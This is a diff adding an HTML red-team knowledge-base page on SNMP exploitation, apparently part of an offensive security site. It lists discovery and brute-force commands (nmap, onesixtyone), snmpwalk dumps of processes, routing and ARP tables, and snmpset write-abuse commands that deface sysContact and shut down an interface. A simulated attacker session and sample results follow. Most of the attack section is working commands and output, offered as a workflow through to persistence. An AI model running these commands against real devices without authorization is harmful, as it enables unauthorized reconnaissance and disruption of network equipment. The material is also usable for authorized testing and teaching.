@@ -1,0 +1,188 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">SNMP Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Network Security</strong> • Focus: <strong>SNMP Abuse & Misconfigurations</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    SNMP (Simple Network Management Protocol) is used to monitor and manage network devices. 
+    Versions 1 and 2c use community strings ("public"/"private") instead of strong authentication, 
+    making them vulnerable to brute force and misconfiguration abuse. Attackers exploit SNMP 
+    to dump routing tables, interface configs, running processes, and even modify device 
+    settings if write access is available. SNMP exploitation is a classic entry point for 
+    reconnaissance, lateral movement, and persistence in Red Team operations.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak Authentication:</strong> Community strings like "public"/"private" are often left unchanged.</li>
+    <li><strong>Information Disclosure:</strong> Network topology, users, processes, and configs are exposed.</li>
+    <li><strong>Write Access:</strong> If enabled, attackers can reconfigure network devices remotely.</li>
+    <li><strong>SNMPv1/v2c Insecurity:</strong> No encryption, queries can be sniffed or spoofed.</li>
+    <li><strong>Attack Surface:</strong> Routers, switches, printers, firewalls, and servers all expose SNMP.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify open UDP/161 services.</li>
+    <li><strong>Community String Brute Force:</strong> Guess "public"/"private" or use wordlists.</li>
+    <li><strong>Enumeration:</strong> Query OIDs for system info, users, routing tables, ARP cache.</li>
+    <li><strong>Exploitation:</strong> If write enabled, change configs (routes, shutdown ports).</li>
+    <li><strong>Impact:</strong> Recon data theft, MITM attacks, persistence in network devices.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for SNMP service on UDP/161.</li>
+    <li>Attempt default community strings (public/private).</li>
+    <li>Brute-force community strings if necessary.</li>
+    <li>Dump SNMP data (system info, network configs, ARP, routing).</li>
+    <li>Check for write access → modify configs / persistence.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -sU -p 161 --script snmp-info [target]       # SNMP info enumeration
+onesixtyone -c community.txt [target]             # Bruteforce community strings
+
+# ------------------------------
+# Basic Enumeration
+# ------------------------------
+snmpwalk -v2c -c public [target]                  # Walk with community string
+snmpget -v2c -c public [target] sysDescr.0       # Get system description
+snmpbulkwalk -v2c -c public [target]             # Faster enumeration
+
+# ------------------------------
+# Extracting Sensitive Data
+# ------------------------------
+snmpwalk -v2c -c public [target] hrSystemProcesses  # Running processes
+snmpwalk -v2c -c public [target] hrSWInstalled     # Installed software
+snmpwalk -v2c -c public [target] ipRouteTable      # Routing table
+snmpwalk -v2c -c public [target] ipNetToMediaTable # ARP cache
+
+# ------------------------------
+# Write Access Abuse (dangerous!)
+# ------------------------------
+snmpset -v2c -c private [target] sysContact.0 s "Hacked by Saide"
+snmpset -v2c -c private [target] ifAdminStatus.1 i 2   # Shutdown interface
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -sU -p161 192.168.1.50 --script snmp-info
+onesixtyone -c community.txt 192.168.1.50
+snmpwalk -v2c -c public 192.168.1.50
+snmpset -v2c -c private 192.168.1.50 sysContact.0 s "Hacked"
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -sU -p161 192.168.1.50 --script snmp-info
+PORT    STATE SERVICE
+161/udp open  snmp
+| snmp-info: 
+|   enterprise: Linux 5.10
+|   contact: admin@corp.local
+|_  location: Data Center A
+
+[ saide ~ ]$ onesixtyone -c community.txt 192.168.1.50
+Scanning 192.168.1.50...
+Community string "public" works!
+
+[ saide ~ ]$ snmpwalk -v2c -c public 192.168.1.50 sysDescr
+SNMPv2-MIB::sysDescr.0 = STRING: Linux server01 5.10.0-20-amd64
+
+[ saide ~ ]$ snmpwalk -v2c -c public 192.168.1.50 hrSystemProcesses
+Running processes: sshd, mysql, apache2, vsftpd
+
+[ saide ~ ]$ snmpwalk -v2c -c public 192.168.1.50 ipRouteTable
+10.0.0.0/8 via 192.168.1.1
+172.16.0.0/16 via 192.168.1.254
+
+[ saide ~ ]$ snmpset -v2c -c private 192.168.1.50 sysContact.0 s "Hacked by Saide"
+[+] sysContact modified successfully
+
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample SNMP exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# SNMP Banner Info
+sysDescr.0: Linux server01 5.10.0-20-amd64
+sysContact.0: admin@corp.local
+sysLocation.0: Data Center A
+
+# Running Processes
+sshd, mysql, apache2, vsftpd
+
+# Network Info
+ipRouteTable:
+  10.0.0.0/8 → via 192.168.1.1
+  172.16.0.0/16 → via 192.168.1.254
+ipNetToMediaTable:
+  192.168.1.10 → 00:11:22:33:44:55
+  192.168.1.20 → 00:aa:bb:cc:dd:ee
+
+# Write Access Abuse
+sysContact modified → "Hacked by Saide"
+Interface eth0 shutdown remotely!
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting SNMP
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1046/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Network Service Scanning (SNMP exposure)
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Bruteforce → Enum configs → Abuse write access → Persistence.</li>
+  </ul>
+</section>
